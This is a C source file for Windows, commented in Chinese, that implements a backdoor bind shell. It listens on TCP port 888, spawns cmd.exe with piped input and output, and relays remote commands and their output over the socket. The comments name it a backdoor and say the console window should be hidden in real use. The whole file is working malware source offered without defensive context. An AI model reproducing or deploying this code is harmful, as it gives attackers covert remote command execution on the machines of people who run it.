#include <stdio.h>
#include <winsock2.h>
#pragma comment (lib, "ws2_32")

int main()
{
    WSADATA wsa;

    WSAStartup(MAKEWORD(2, 2), &wsa);

    // 创建TCP套接字
    SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    // 绑定套接字
    sockaddr_in sock;
    sock.sin_family = AF_INET;
    sock.sin_addr.S_un.S_addr = ADDR_ANY;
    sock.sin_port = htons(888);
    bind(s, (SOCKADDR*)&sock, sizeof(SOCKADDR));

    // 置套接字为监听状态
    listen(s, 1);

    // 接受客户端请求
    sockaddr_in sockClient;
    int SaddrSize = sizeof(SOCKADDR);
    SOCKET sc = accept(s, (SOCKADDR*)&sockClient, &SaddrSize);

    // 创建管道
    SECURITY_ATTRIBUTES sa1, sa2;
    HANDLE hRead1, hRead2, hWrite1, hWrite2;

    sa1.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa1.lpSecurityDescriptor = NULL;
    sa1.bInheritHandle = TRUE;

    sa2.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa2.lpSecurityDescriptor = NULL;
    sa2.bInheritHandle = TRUE;

    CreatePipe(&hRead1, &hWrite1, &sa1, 0);
    CreatePipe(&hRead2, &hWrite2, &sa2, 0);

    // 创建用于通信的子进程
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    // 为了测试这里设置为SW_SHOW,在实际中应该为SW_HIDE
    si.wShowWindow = SW_SHOW;
    // 替换标准输入输出句柄
    // 对木后门程序，管道1用于进行输出
    // 对于后门程序，管道2用于输入
    si.hStdInput = hRead2;
    si.hStdOutput = hWrite1;
    si.hStdError = hWrite1;

    char *szCmd = "cmd";

    CreateProcess(NULL, szCmd, NULL, NULL, 
                  TRUE, 0, NULL, NULL, &si, &pi);

    DWORD dwBytes = 0;
    BOOL bRet = FALSE;
    char szBuffer[0x1000] = { 0 };
    char szCommand[0x1000] = { 0 };

    while ( TRUE )
    {
        ZeroMemory(szCommand, 0x1000);

        bRet = PeekNamedPipe(hRead1, szBuffer, 0x1000, &dwBytes, 0, 0);
        if ( dwBytes )
        {
            // 当hStdOutput和hStdError向管道1写入数据后
            // 应该将管道1中的数据读出
            ReadFile(hRead1, szBuffer, 0x1000, &dwBytes, NULL);
            send(sc, szBuffer, dwBytes, 0);
        } 
        else
        {
            // 父进程接受到控制端的数据后
            // 写入到管道2中
            int i = 0;
            while ( 1 )
            {
                dwBytes = recv(sc, szBuffer, 0x1000, 0);
                if ( dwBytes <= 0 )
                {
                    break;
                }
                
                szCommand[i++] = szBuffer[0];
                if ( szBuffer[0] == '\r' || szBuffer[0] == '\n' )
                {
                    szCommand[i-1] = '\n';
                    break;
                }
            }
            WriteFile(hWrite2, szCommand, i, &dwBytes, NULL);
        }
    }

    WSACleanup();

    return 0;
}